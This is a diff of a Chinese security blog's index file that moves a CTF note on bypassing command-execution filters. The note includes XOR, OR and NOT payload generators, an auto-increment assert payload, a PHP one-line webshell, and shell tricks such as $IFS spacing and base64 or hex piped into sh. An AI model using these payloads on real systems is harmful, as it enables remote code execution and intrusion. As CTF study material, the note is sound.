class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php运行后生成一个txt文档，包含所有可见字符的异或构造结果。</span><br><span class="line">接着运行python脚本即可。</span><br><span class="line">运行结果</span><br><span class="line"></span><br><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(<span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span>)(<span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="2）或"><a href="#2）或" class="headerlink" title="2）或"></a>2）或</h3><p>system(“ls”);     使用XOR绕过，得到目录信息</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?a=<span class="variable">$_</span>=(<span class="string">&#x27;(&quot;((%-&#x27;</span> ^ <span class="string">&#x27;[[[\@@&#x27;</span>);<span class="variable">$__</span>=(<span class="string">&#x27;[,([&#x27;</span>^<span class="string">&#x27;|@[|&#x27;</span>);<span class="variable">$_</span>(<span class="variable">$__</span>);</span><br></pre></td></tr></table></figure>
-
-<p>原理是一样的，只需要在上面的脚本上稍加改动即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="3）取反"><a href="#3）取反" class="headerlink" title="3）取反"></a>3）取反</h3><p>因为取反的话，基本上用的都是一个不可见字符，所有不会触发到<a href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1001.2101.3001.7020">正则表达式</a>，我们一个php脚本就可以</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="4）自增"><a href="#4）自增" class="headerlink" title="4）自增"></a>4）自增</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试发现7.0.12以上版本不可使用</span></span><br><span class="line"><span class="comment">//使用时需要url编码下</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="5）利用UTF-8编码进行异或绕过-使用post传参数​2-system-cat-zheshiflag-php-。​"><a href="#5）利用UTF-8编码进行异或绕过-使用post传参数​2-system-cat-zheshiflag-php-。​" class="headerlink" title="5）利用UTF-8编码进行异或绕过,使用post传参数​2=system(&#39;cat zheshiflag.php &#39;)。​"></a>5）<strong>利用UTF-8编码进行异或绕过,使用post传参数</strong>​<code>2=system(&#39;cat zheshiflag.php &#39;)。</code>​</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url?a=<span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20231015100334-3qcjdcw.png" class="" title="image">​
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">除这些之外我们还可以这样用`<span class="variable">$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;</span>&#123;%86&#125;();&amp;%86=phpinfo`​其中`<span class="string">&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</span>`​为构造出的`_GET`​，适合于过滤了引号的情况下使用。</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="5-一句话木马中的-被过滤"><a href="#5-一句话木马中的-被过滤" class="headerlink" title="5.一句话木马中的?被过滤"></a>5.一句话木马中的?被过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>绕过</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="6-将文件上传的文件名进行随机化"><a href="#6-将文件上传的文件名进行随机化" class="headerlink" title="6.将文件上传的文件名进行随机化"></a>6.将文件上传的文件名进行随机化</h2><p>可以利用文件上传+文件包含读取flag</p>
-<img src="/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20231018103852-5tjnm7a.png" class="" title="image">​
-
-<h2 id="7-命令联合执行"><a href="#7-命令联合执行" class="headerlink" title="7.命令联合执行"></a>7.命令联合执行</h2><p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）</p>
-<p>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p>
-<p>‍</p>
-<h2 id="8-反引号"><a href="#8-反引号" class="headerlink" title="8.反引号&#96;"></a>8.反引号&#96;</h2><p>内联，就是将反引号内命令的输出作为输入执行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span>在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或<span class="variable">$IFS</span>垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="9-flag过滤"><a href="#9-flag过滤" class="headerlink" title="9.flag过滤"></a>9.flag过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh     <span class="comment">#sh是执行echo后面的解码内容</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=ag;b=fl;cat $b<span class="variable">$a</span>;   <span class="comment">#注意有时候需要将ab的顺便倒置才能getshell</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl<span class="string">&#x27;&#x27;</span>ag.php        两个单引号绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | base64 -d | bash    </span><br><span class="line"><span class="comment">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | bash     </span><br><span class="line"><span class="comment">//hex编码绕过(引号可以去掉)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | sh   </span><br><span class="line"><span class="comment">//sh的效果和bash一样</span></span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a<span class="variable">$b</span>          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;<span class="number">21</span>&#125;t a.txt     利用空变量  使用$*和$@，<span class="variable">$x</span>(x 代表 <span class="number">1</span>-<span class="number">9</span>),$&#123;x&#125;(x&gt;=<span class="number">10</span>)(小于 <span class="number">10</span> 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
     <title>同源策略及跨站访问</title>
     <url>/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/</url>
     <content><![CDATA[<p>摘要</p>
@@ -1854,6 +1780,80 @@
 <pre><code>   上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  &#39;  \  &#39;后面的3个字符连同&#39;  \  &#39;算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。
 </code></pre>
 <img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231023164538-z1kpjhr.png" class="" title="image">​
+
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>命令执行绕过</title>
+    <url>/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%09</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"></span><br><span class="line">&lt;</span><br><span class="line"></span><br><span class="line">IFS9 </span><br><span class="line">&#123;IFS&#125; </span><br><span class="line"><span class="variable">$IFS</span> </span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行 </span><br><span class="line">IFS </span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来 </span><br><span class="line">%20   (space) </span><br><span class="line">%09   (tab) </span><br><span class="line">X\=<span class="string">&#x27;cat\\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\\x09表示tab，也可以用\\x20）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>‍</p>
+<h2 id="2-system函数绕过"><a href="#2-system函数绕过" class="headerlink" title="2.system函数绕过"></a>2.system函数绕过</h2><p>passthru</p>
+<p>‍</p>
+<h2 id="3-cat绕过"><a href="#3-cat绕过" class="headerlink" title="3.cat绕过"></a>3.cat绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">od</span></span><br><span class="line"></span><br><span class="line">less</span><br><span class="line"></span><br><span class="line">more</span><br><span class="line"></span><br><span class="line">使用<span class="built_in">tac</span>反向输出命令： </span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>
+
+
+
+<p>‍</p>
